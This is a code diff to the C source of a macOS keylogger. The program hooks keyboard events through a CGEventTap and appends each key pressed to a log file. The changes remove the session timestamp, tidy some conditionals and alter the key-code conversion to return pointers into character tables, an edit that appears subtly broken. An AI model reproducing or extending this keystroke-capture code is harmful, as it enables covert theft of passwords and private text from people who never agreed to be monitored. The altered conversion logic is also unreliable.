@@ -43,15 +43,11 @@ int main(int argc, const char *argv[]) {
       printf("%s cleared.\n", logfileLocation);
       fflush(stdout);
       exit(1);
-    } else {
+    } else
       logfileLocation = argv[1];
-    }
   }
 
-  // Get the current time and open the logfile.
-  time_t result = time(NULL);
   logfile = fopen(logfileLocation, "a");
-
   if (!logfile) {
     fprintf(stderr,
             "ERROR: Unable to open log file. Ensure that you have the proper "
@@ -60,8 +56,7 @@ int main(int argc, const char *argv[]) {
   }
 
   // Output to logfile.
-  fprintf(logfile, "\n\nKeylogging has begun.\n%s\n",
-          asctime(localtime(&result)));
+  fprintf(logfile, "\n\nKeylogging has begun.\n");
   fflush(logfile);
 
   // Display the location of the logfile and start the loop.
@@ -121,9 +116,7 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type,
   lastFlags = flags;
 
   // Only log key down events.
-  if (!down) {
-    return event;
-  }
+  if (!down) return event;
 
   // Print the human readable key to the logfile.
   bool shift = flags & kCGEventFlagMaskShift;
@@ -151,17 +144,17 @@ const char *nums = "01234567 89";
 const char *convertKeyCode(int keyCode, bool shift, bool caps) {
   switch ((int)keyCode) {
     case 0 ... 17:
-      return shift || caps ? letters_cap_set1[keyCode]
-                           : letters_small_set1[keyCode];
+      return shift || caps ? &letters_cap_set1[keyCode]
+                           : &letters_small_set1[keyCode];
     case 18 ... 30:
-      return shift || caps ? symbols_cap_set1[keyCode - 18]
-                           : symbols_small_set1[keyCode - 18];
+      return shift || caps ? &symbols_cap_set1[keyCode - 18]
+                           : &symbols_small_set1[keyCode - 18];
     case 31 ... 35:
     // NO 36
     case 37:
     case 38:
-      return shift || caps ? letters_cap_set2[keyCode - 31]
-                           : letters_small_set2[keyCode - 31];
+      return shift || caps ? &letters_cap_set2[keyCode - 31]
+                           : &letters_small_set2[keyCode - 31];
     case 39:
       return shift ? "\"" : "'";
     case 40:
@@ -202,7 +195,7 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
     case 82 ... 89:
     // NO 90
     case 91 ... 92:
-      return nums[keyCode - 82];
+      return &nums[keyCode - 82];
     case 36:
       return "[ret]";
     case 48:
